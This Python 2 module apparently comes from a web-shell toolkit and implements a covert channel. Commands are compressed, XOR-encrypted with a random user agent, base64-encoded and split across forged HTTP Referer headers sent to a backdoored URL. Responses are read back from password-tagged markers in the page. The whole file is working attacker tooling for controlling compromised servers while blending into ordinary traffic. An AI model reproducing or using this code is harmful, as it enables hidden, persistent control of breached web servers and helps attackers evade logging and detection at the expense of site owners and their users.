from core.channels.stegaref.formatters import FirstFormat, PayloadFormat
from mako.template import Template
from core.weexceptions import FatalException
from core import messages
from core import commons
import cookielib
import random
import urllib2
import hashlib
import logging
import base64
import zlib
import re
from base64 import b64decode

referrer_templates_path = 'core/channels/stegaref/referrers.tpl'
useragents_templates_path = 'core/channels/stegaref/useragents.tpl'


class StegaRef:
    
    def __init__(self, url, password):
        """ Class to load referrer vectors template and format it with payload """

        self.referrers = []
        self.useragents = []

        self.password = password
        self.url = url
        self.key = hashlib.md5(password).hexdigest()
        self.trigger = self.key[:3]
        self.terminator = self.key[3:6]
        
        self.re_response = re.compile( "<%s>(.*)</%s>" % ( self.key[:6], self.key[:6] ), re.DOTALL)
        self.re_debug = re.compile( "<%sDEBUG>(.*?)</%sDEBUG>" % ( self.key[:6], self.key[:6] ), re.DOTALL )
        
        self._load_referrers_templates()
        self._format_referrers()
        self._load_useragents()
      
      
    def _load_useragents(self):

        try:
                   
            self.useragents = [ r for r in open(useragents_templates_path).read().split('\n') if r.strip() and not r.strip().startswith('#') ]
            
        except Exception as e:
            raise FatalException(messages.stegareferrer.error_loading_referrers_s_s % (useragents_templates_path, str(e)))  
        
      
    def _load_referrers_templates(self):
        
        try:
                   
            self.referrers_templates = [ r for r in open(referrer_templates_path).read().split('\n') if r.startswith('http') ]
            
        except Exception as e:
            raise FatalException(messages.stegareferrer.error_loading_referrers_s_s % (referrer_templates_path, str(e)))  

        
    def _format_referrers(self):


        for template in self.referrers_templates:
            
            formatting_object = FirstFormat(self.url)
            
            template_first_formatted = Template(template).render(tpl = formatting_object)
            self.referrers.append((template_first_formatted, formatting_object.chunks_sizes))
        
        


    def _prepare(self, payload):

        prepared_vectors = []
        
        while True:
            
            user_agent = random.choice(self.useragents)
            user_agent_xor = commons.sxor(user_agent, self.trigger)
            remaining_payload = base64.b64encode(commons.sxor(zlib.compress(payload), user_agent_xor)).replace('+', '_')
            
            #logging.debug('req_orig_len: %i, req_enc_len: %i' % (len(payload), len(remaining_payload)))

            formatter = PayloadFormat(remaining_payload, self.trigger, self.terminator)

            template, chunks_sizes = random.choice(self.referrers)

            if (self.trigger in template or 
                self.trigger in remaining_payload or 
                self.terminator in template or
                self.terminator in remaining_payload):
            
                logging.debug(messages.stegareferrer.error_conflict_url_key)
            
            else:
                
                logging.debug('user_agent \'%s\', password \'%s\', trigger \'%s\', terminator \'%s\', original_payload: \'%s\', prepared_payload \'%s\'' % (user_agent, self.password, self.trigger, self.terminator, payload, remaining_payload))
                
                while formatter.terminator:
                    prepared_vectors.append(Template(template).render(tpl = formatter))
                                        
                return prepared_vectors, user_agent, user_agent_xor


    def send(self, original_payload):
     
     
        debug_mode = logging.getLogger().getEffectiveLevel() == logging.DEBUG
     
        prepared_vectors, user_agent, user_agent_xor = self._prepare(original_payload)
         
        cj = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
     
        for i, v in enumerate(prepared_vectors):
            
            opener.addheaders = [('Referer', v), ('User-agent', user_agent)]
            
            logging.debug('[v:%i/%i] %s' % (i, len(prepared_vectors), v))
            
            response = opener.open(self.url).read()

            if response:
                
                if debug_mode:
                    
                    # Multiple debug string may have been printed, using findall
                    
                    matched_debug = self.re_debug.findall(response)
                    if matched_debug:
                        logging.debug('\n'.join(matched_debug))
                
                matched = self.re_response.search(response)
                if matched and matched.group(1):
                    return zlib.decompress(commons.sxor(base64.b64decode(matched.group(1)), user_agent_xor))

            
            
